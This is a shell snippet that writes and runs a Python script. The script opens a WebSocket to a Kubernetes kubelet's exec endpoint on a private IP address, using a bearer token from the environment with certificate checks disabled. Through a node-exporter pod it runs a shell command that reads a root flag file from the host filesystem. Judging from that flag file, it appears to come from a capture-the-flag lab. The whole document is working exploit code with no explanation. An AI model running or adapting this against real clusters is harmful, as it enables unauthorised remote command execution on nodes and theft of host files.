cat > /tmp/kube_exec.py <<'PY'
import os
import ssl
from urllib.parse import urlencode

from websockets.sync.client import connect
from websockets.exceptions import InvalidStatus

NODE = "10.129.181.183"
NAMESPACE = "monitoring"
POD = "prometheus-prometheus-node-exporter-nmntq"
CONTAINER = "node-exporter"

COMMAND = "cat /host/root/root/root.txt"

params = urlencode([
    ("command", "/bin/sh"),
    ("command", "-c"),
    ("command", COMMAND),
    ("output", "1"),
    ("error", "1"),
])

url = (
    f"wss://{NODE}:10250/exec/"
    f"{NAMESPACE}/{POD}/{CONTAINER}"
    f"?{params}"
)

ssl_context = ssl._create_unverified_context()

try:
    with connect(
        url,
        additional_headers={
            "Authorization": f"Bearer {os.environ['TOKEN']}"
        },
        subprotocols=["v4.channel.k8s.io"],
        ssl=ssl_context,
        open_timeout=8,
        close_timeout=2,
        max_size=None,
    ) as ws:
        print("[+] WebSocket connecté", flush=True)
        print("[+] Protocole :", ws.subprotocol)

        for message in ws:
            if isinstance(message, bytes):
                if not message:
                    continue

                channel = message[0]
                payload = message[1:].decode(errors="replace")

                print(
                    f"[channel {channel}] {payload}",
                    end="",
                    flush=True,
                )
            else:
                print(message, flush=True)

except InvalidStatus as exc:
    print(f"[-] Handshake refusé : {exc}")

    if exc.response is not None:
        print("[-] Headers :", exc.response.headers)
        print("[-] Body :", exc.response.body)

except TimeoutError:
    print("[-] Timeout de connexion")

except Exception as exc:
    print(f"[-] {type(exc).__name__}: {exc}")
PY

python3 /tmp/kube_exec.py